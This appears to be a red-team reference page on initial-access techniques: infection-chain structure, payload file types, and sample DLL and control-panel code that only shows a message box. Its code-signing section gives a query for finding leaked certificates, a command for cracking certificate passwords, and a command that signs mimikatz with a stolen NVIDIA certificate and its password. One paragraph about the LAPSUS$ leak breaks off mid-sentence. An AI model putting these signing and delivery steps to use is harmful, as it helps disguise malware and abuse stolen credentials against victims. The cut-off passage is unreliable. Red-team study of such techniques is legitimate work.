# Initial Access

> Initial Access Files in the context of a Red Team exercise refer to the set of files, scripts, executables, or documents used by the Red Team to initially infiltrate the target system or network. These files often contain malicious payloads or are designed to exploit specific vulnerabilities in order to establish a foothold in the target environment.

## Summary

* [Complex Chains](#complex-chains)
* [Payloads](#payloads)
    * [Binary Files](#binary-files)
    * [Code Execution Files](#code-execution-files)
    * [Embedded Files](#embedded-files)
* [Code Signing](#code-signing)


## Complex Chains

> DELIVERY(CONTAINER(TRIGGER + PAYLOAD + DECOY))

* **DELIVERY**: means to deliver a pack full of files
    * HTML Smuggling, SVG Smuggling, Attachments
* **CONTAINER**: archive bundling all infection dependencies
    * ISO/IMG, ZIP, WIM
* **TRIGGER**: some way to run the payload
    * LNK, CHM, ClickOnce applications
* **PAYLOAD**: the malware
    * Binary Files
    * Code Execution Files
    * Embedded Files
* **DECOY**: used to continue pretext narration after detonating malware
    * Typically open PDF files


## Payloads

### Binary Files

These files can be executed directly on the system without any third party.

* **.exe** file, executable file can be run with a click
* **.dll** file, execute with `rundll32 main.dll,DllMain`
    ```c
    #define WIN32_LEAN_AND_MEAN
    #include <windows.h>

    extern "C" __declspec(dllexport)
    DWORD WINAPI MessageBoxThread(LPVOID lpParam) {
    MessageBox(NULL, "Hello world!", "Hello World!", NULL);
    return 0;
    }

    extern "C" __declspec(dllexport)
    BOOL APIENTRY DllMain(HMODULE hModule,
                        DWORD ul_reason_for_call,
                        LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
        CreateThread(NULL, NULL, MessageBoxThread, NULL, NULL, NULL);
        break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
    }
    ```
* **.cpl** file, same as a .dll file with Cplapplet export
    ```c
    #include "stdafx.h"
    #include <Windows.h>

    extern "C" __declspec(dllexport) LONG Cplapplet(
        HWND hwndCpl,
        UINT msg,
        LPARAM lParam1,
        LPARAM lParam2
    )
    {
        MessageBoxA(NULL, "Hey there, I am now your control panel item you know.", "Control Panel", 0);
        return 1;
    }

    BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
                        LPVOID lpReserved
                        )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
        {
            Cplapplet(NULL, NULL, NULL, NULL);
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
    ```


### Code Execution Files

* Word with Macro (.doc, .docm)
* Excel library (.xll)
* Excel macro-enabled add-in file (.xlam)
* WSF files (.wsf)
* MSI installers (.msi)
* MSIX/APPX app package (.msix, .appx)
* ClickOnce (.application, .vsto)


### Embedded Files

* ICS Calendar Invites with Embedded Files


## Code Signing

Certificate can be **Expired**, **Revoked**, **Valid**.

Many certificates leaked on the Internet and got re-used by Threat Actor.
Some of them can be found on VirusTotal, with the query :  `content:{02 01 03 30}@4 AND NOT tag:peexe`

In 2022, LAPSUS$ claimed responsibility for a cyberattack on NVIDIA, a major graphics card and AI technology manufacturer. As part of this attack, LAPSUS$ allegedly stole proprietary data from NVIDIA and threatened to leak it. The leak contained


* Certificates can be password protected. Use [pfx2john.py](https://gist.github.com/tijme/86edd06c636ad06c306111fcec4125ba)
    ```ps1
    john --wordlist=/opt/wordlists/rockyou.txt --format=pfx pfx.hashes
    ```
* Sign a binary with a certificate.
    ```ps1
    osslsigncode sign -pkcs12 certs/nvidia-2014.pfx -in mimikatz.exe -out generated/signed-mimikatz.exe -pass nv1d1aRules
    ```
* The following files can be signed with a certificate
    * executables: .exe, .dll, .ocx, .xll, .wll
    * scripts: .vbs, .js, .ps1
    * installers: .msi, .msix, .appx, .msixbundle, .appxbundle
    * drivers: .sys
    * cabinets: .cab
    * ClickOnce: .application, .manifest, .vsto


## References

* [Top 10 Payloads: Highlighting Notable and Trending Techniques - delivr.to](https://blog.delivr.to/delivr-tos-top-10-payloads-highlighting-notable-and-trending-techniques-fb5e9fdd9356)
* [Executing Code as a Control Panel Item through an Exported Cplapplet Function - @spotheplanet](https://www.ired.team/offensive-security/code-execution/executing-code-in-control-panel-item-through-an-exported-cplapplet-function)
* [02. Desperate Infection Chains - Multi-Step Initial Access Strategies by Mariusz Banach](https://youtu.be/CwNPP_Xfrts)
* [Red Macros Factory - https://binary-offensive.com/](https://binary-offensive.com/initial-access-framework)